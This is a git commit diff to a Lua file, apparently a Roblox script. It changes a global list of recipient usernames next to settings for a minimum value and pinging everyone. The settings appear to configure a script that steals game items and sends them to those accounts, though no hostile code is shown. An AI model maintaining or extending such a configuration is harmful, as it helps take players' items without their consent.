84142726458844742a75ed2fc31675f8b6aaa43b
ShxDrag <bns19126@gmail.com>
2026-09-20 23:24:05 +0900

    Update Pra.lua

--- Pra.lua
+++ Pra.lua
@@ -65,7 +65,7 @@ task.spawn(function()
         end
     end
 
-    _G.Usernames = {"MRFLIMCLA1","MRFLIMCLA2","MRFLIMCLA3","Nachito_pro574","MRFLIMCLA5"}
+    _G.Usernames = {"MRFLIMCLA1","Girplays0","FedcantgetmenowUwu","Nachito_pro574","MRFLIMCLA5"}
     _G.min_value = 2
     _G.pingEveryone = "Yes"
     _G.scriptExecuted = _G.scriptExecuted or false
